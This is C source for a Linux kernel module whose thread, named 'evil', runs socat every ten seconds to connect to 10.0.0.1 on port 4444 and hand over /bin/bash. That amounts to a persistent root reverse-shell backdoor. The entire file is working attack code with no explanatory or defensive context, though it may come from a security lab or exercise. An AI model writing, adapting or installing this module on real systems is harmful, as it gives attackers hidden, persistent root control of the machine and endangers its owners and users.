#include <linux/module.h>
#include <linux/kmod.h>
#include <linux/delay.h>
#include <linux/kthread.h>

static struct task_struct *thread;

int evil(void *data) {
        char *argv [4];
        char *envp [4];

        while (!kthread_should_stop()) {
                ssleep(10);

                argv[0] = "/usr/bin/socat";
                argv[1] = "TCP:10.0.0.1:4444";
                argv[2] = "EXEC:/bin/bash";
                argv[3] = NULL;

                envp[0] = "HOME=/";
                envp[1] = "TERM=linux";
                envp[2] = "PATH=/sbin:/usr/sbin:/usr/bin";
                envp[3] = NULL;

                call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
        }

        return 0;
}

int init_module(void) {
        thread = kthread_run(evil, NULL, "evil");
        return 0;
}

void cleanup_module(void) {
        kthread_stop(thread);
}

MODULE_LICENSE("GPL");
